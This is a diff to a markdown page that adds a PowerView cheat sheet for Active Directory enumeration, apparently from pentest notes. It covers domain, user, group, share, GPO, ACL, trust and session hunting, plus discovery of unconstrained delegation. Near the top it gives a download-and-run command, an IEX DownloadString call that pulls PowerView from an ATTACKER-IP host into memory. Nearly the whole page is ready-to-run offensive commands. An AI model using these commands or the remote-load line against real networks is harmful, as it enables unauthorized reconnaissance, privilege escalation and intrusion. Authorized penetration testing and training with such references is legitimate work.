@@ -4,20 +4,306 @@ title: "Enumeration"
 
 ## Using old windows tools
 
-```
+```shellscript
 net user /domain
 ```
 
-```
+```shellscript
 net user USER-HERE /domain
 ```
 
-```
+```shellscript
 net group /domain
 ```
 
-```
+```shellscript
 net group "GROUP NAME HERE" /domain
 ```
 
-## PowerShell
+---
+
+# 🧠 PowerView Cheat Sheet
+
+## 📥 Loading PowerView
+
+### Download PowerView to the attacker machine (Python HTTP server)
+
+```powershell
+python3 -m http.server 80
+```
+
+### Load PowerView directly into memory (recommended)
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER-IP/PowerView.ps1')
+```
+
+### Alternative (Invoke-WebRequest + Import)
+
+```powershell
+Invoke-WebRequest -Uri http://ATTACKER-IP/PowerView.ps1 -OutFile PowerView.ps1
+```
+
+```powershell
+Import-Module .\PowerView.ps1
+```
+
+---
+
+## 🌐 General Domain Enumeration
+
+**Get basic information about the domain**
+
+```powershell
+Get-NetDomain [-Domain <target>]
+```
+
+**Retrieve the Domain SID**
+
+```powershell
+Get-DomainSID
+```
+
+**List domain policies**
+
+```powershell
+Get-DomainPolicy [-Domain <target>]
+```
+
+**Show Kerberos policy**
+
+```powershell
+(Get-DomainPolicy)."kerberos policy"
+```
+
+**List Domain Controllers**
+
+```powershell
+Get-NetDomainController [-Domain <target>]
+```
+
+---
+
+## 👤 User Enumeration
+
+**List domain users**
+
+```powershell
+Get-NetUsers [-Username <username>]
+```
+
+**Get specific user properties**
+
+```powershell
+Get-UserProperty [-Properties <property>]
+```
+
+**Count users**
+
+```powershell
+(Get-NetUsers | select name).count
+```
+
+**Find users with bad password attempts**
+
+```powershell
+Get-NetUsers | select name,badpwdcount | where badpwdcount
+```
+
+**Sort users by logon count**
+
+```powershell
+Get-UserProperty -Properties logoncount | where logoncount | sort logoncount -Descending
+```
+
+**Check who is logged locally**
+
+```powershell
+Get-LoggedOnLocal [-ComputerName <name>]
+```
+
+---
+
+## 💻 Computer Enumeration
+
+**List domain computers**
+
+```powershell
+Get-NetComputer [-FullData] [-Ping] [-OperatingSystem "*server*"] [-Domain <target>]
+```
+
+**Detailed computer info**
+
+```powershell
+Get-NetComputer -FullData | select name,logoncount,operatingsystem,badpwdcount
+```
+
+---
+
+## 👥 Group Enumeration
+
+**List groups / admin groups**
+
+```powershell
+Get-NetGroup [-Domain <target>] [-FullData] [-GroupName "*admin*"] [-Username 'user_name']
+```
+
+**Group members**
+
+```powershell
+Get-NetGroupMember [-GroupName 'group_name'] [-Recurse]
+```
+
+---
+
+## 📂 Share Enumeration
+
+**Find interesting shares**
+
+```powershell
+Invoke-ShareFinder -ExcludeStandard -ExcludeIPC -ExcludePrint
+```
+
+---
+
+## 🧾 GPO Enumeration
+
+**List GPOs**
+
+```powershell
+Get-NetGPO [-ComputerName <hostname.domain>]
+```
+
+**Find interesting GPO groups**
+
+```powershell
+Get-NetGPOGroup
+```
+
+**Find local admins assigned via GPO**
+
+```powershell
+Find-GPOComputerAdmin [-ComputerName <FQDN_computer>]
+```
+
+---
+
+## 🏢 OU Enumeration
+
+**List OUs**
+
+```powershell
+Get-NetOU [-FullData]
+```
+
+**Get GPO links**
+
+```powershell
+(Get-NetOU -Name 'test').gplink
+```
+
+**Retrieve GPO from GUID**
+
+```powershell
+Get-NetGPO -GPOName '{GUID}'
+```
+
+**Resolve OU applied GPO**
+
+```powershell
+((Get-NetOU -FullData <OU_NAME>).gplink -split "cn=" -split ",")[1] | Get-NetGPO
+```
+
+---
+
+## 🔐 ACL Enumeration
+
+**View ACLs**
+
+```powershell
+Get-ObjectAcl [-Name 'domain admins'] -ResolveGUIDS
+```
+
+**Scan domain for interesting ACLs**
+
+```powershell
+Invoke-ACLScanner -ResolveGUIDS
+```
+
+**Find permissions of specific user**
+
+```powershell
+Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match 'svcadmin'}
+```
+
+---
+
+## 🔗 Trust Enumeration
+
+**Map domain trusts**
+
+```powershell
+Get-NetDomainTrust [-Domain <target>]
+```
+
+**Forest information**
+
+```powershell
+Get-NetForest [-Forest <target>]
+```
+
+**Domains in forest**
+
+```powershell
+Get-NetForestDomain [-Forest <target>]
+```
+
+---
+
+## 🎯 User Hunting
+
+**Machines where current user is admin**
+
+```powershell
+Find-LocalAdminAccess
+```
+
+**Enumerate local admins**
+
+```powershell
+Invoke-EnumerateLocalAdmin
+```
+
+**Find privileged sessions**
+
+```powershell
+Invoke-UserHunter [-GroupName <group_name>] [-CheckAccess]
+```
+
+---
+
+## 🧑‍💻 Finding Sessions
+
+**Active sessions**
+
+```powershell
+Get-NetSession [-ComputerName <comp_name>]
+```
+
+**Logged users**
+
+```powershell
+Get-LoggedOnLocal [-ComputerName <comp_name>]
+```
+
+---
+
+## ⬆️ Privilege Escalation
+
+**Find unconstrained delegation systems**
+
+```powershell
+Get-NetComputer -Unconstrained
+```
+
+---
